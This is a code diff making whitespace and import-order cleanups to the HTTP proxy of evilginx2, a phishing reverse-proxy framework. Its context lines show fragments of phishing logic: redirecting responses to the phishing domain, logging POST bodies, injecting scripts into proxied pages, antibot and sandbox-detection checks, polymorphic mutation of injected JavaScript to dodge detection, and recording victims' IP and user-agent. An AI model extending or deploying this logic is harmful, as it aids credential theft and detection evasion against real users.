@@ -45,9 +45,9 @@ import (
 	"github.com/kgretzky/evilginx2/core/antibot/response"
 	"github.com/kgretzky/evilginx2/core/antibot/signals"
 	"github.com/kgretzky/evilginx2/database"
-	"github.com/kgretzky/evilginx2/log"
 	"github.com/kgretzky/evilginx2/gophish/evilginx"
 	gp_models "github.com/kgretzky/evilginx2/gophish/models"
+	"github.com/kgretzky/evilginx2/log"
 )
 
 const (
@@ -215,7 +215,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	var telemetrySignal *signals.TelemetrySignal
 	mlEnabled := cfg.IsMLDetectorEnabled()
 	envEnabled := cfg.GetSandboxDetectionConfig() != nil && cfg.GetSandboxDetectionConfig().Enabled
-	
+
 	if mlEnabled || envEnabled {
 		mlThreshold := 0.8 // default
 		if mlEnabled {
@@ -229,7 +229,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	}
 
 	p.antibotEngine = antibot.NewAntibotEngine(ipSignal, rateSignal, tlsSignal, telemetrySignal)
-
 
 	// Initialize polymorphic engine if enabled
 	if cfg.GetPolymorphicConfig() != nil && cfg.GetPolymorphicConfig().Enabled {
@@ -943,7 +942,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						log.Debug("POST: %s", req.URL.Path)
 						log.Debug("POST body = %s", body)
 
-
 						contentType := req.Header.Get("Content-type")
 
 						json_re := regexp.MustCompile(`application\/\\w*\+?json`)
@@ -1222,8 +1220,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			req_hostname := strings.ToLower(resp.Request.Host)
 
-
-
 			// if "Location" header is present, make sure to redirect to the phishing domain
 			r_url, err := resp.Location()
 			if err == nil {
@@ -1295,7 +1291,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// modify received body
 			body, err := ioutil.ReadAll(resp.Body)
-
 
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
@@ -1468,7 +1463,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								body = p.injectOgHeaders(l, body)
 							}
 
-
 							var js_params *map[string]string = nil
 							if s, ok := p.sessions[ps.SessionId]; ok {
 								js_params = &s.Params
@@ -1492,7 +1486,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											SessionID: s.Id,
 											Timestamp: time.Now().Unix(),
 										}
-										
+
 										telemetryJS = p.polymorphicEngine.Mutate(telemetryJS, context)
 										log.Debug("js_inject: applied polymorphic mutation to telemetry script for session: %s", s.Id)
 									}
@@ -1767,7 +1761,6 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 	ret := []byte(re.ReplaceAllString(string(body), d_inject))
 	return ret
 }
-
 
 // extractLiteralHint returns the longest static substring from a regex pattern.
 // Used as a fast-path: if the hint is absent from the haystack, the regex cannot match.
@@ -2265,8 +2258,6 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
-
-
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
@@ -2405,8 +2396,6 @@ func (p *HttpProxy) isGloballyAllowed(ip_addr string) bool {
 	return false
 }
 
-
-
 func (p *HttpProxy) getClientIdentifier(req *http.Request) string {
 	// Extract client IP
 	ip := req.RemoteAddr
@@ -2501,8 +2490,6 @@ func (dumb dumbResponseWriter) WriteHeader(code int) {
 func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
 	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
 }
-
-
 
 func getContentType(path string, data []byte) string {
 	switch filepath.Ext(path) {
@@ -2708,11 +2695,11 @@ func recordGophishEvent(rid string, ip string, userAgent string, eventType strin
 		return
 	}
 	rs.UpdateGeo(ip)
-	
+
 	d := gp_models.EventDetails{
 		Payload: payload,
 		Browser: map[string]string{
-			"address": ip,
+			"address":    ip,
 			"user-agent": userAgent,
 		},
 	}
